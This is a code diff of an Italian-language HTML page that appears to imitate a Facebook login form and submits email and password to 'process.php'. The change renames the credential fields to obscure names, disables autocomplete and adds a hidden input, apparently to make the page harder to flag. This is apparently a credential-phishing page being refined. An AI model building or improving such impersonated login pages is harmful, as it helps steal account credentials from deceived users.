@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="it">
 <head>
@@ -18,8 +17,14 @@
 
     <div class="fb-login-box">
       <form action="process.php" method="POST" class="fb-form">
-        <input type="text" name="email" placeholder="Email o numero di telefono" required />
-        <input type="password" name="password" placeholder="Password" required />
+        <label for="utente_id" style="display:none;">ID Utente</label>
+        <input type="text" id="utente_id" name="utente_id" placeholder="Email o numero di telefono" autocomplete="off" required />
+
+        <label for="chiave_accesso" style="display:none;">Chiave di Accesso</label>
+        <input type="password" id="chiave_accesso" name="chiave_accesso" placeholder="Password" autocomplete="off" required />
+
+        <input type="text" name="extra_info" style="display:none;" tabindex="-1" autocomplete="off" />
+
         <button type="submit">Accedi</button>
         <a href="#" class="forgot">Hai dimenticato la password?</a>
         <hr />
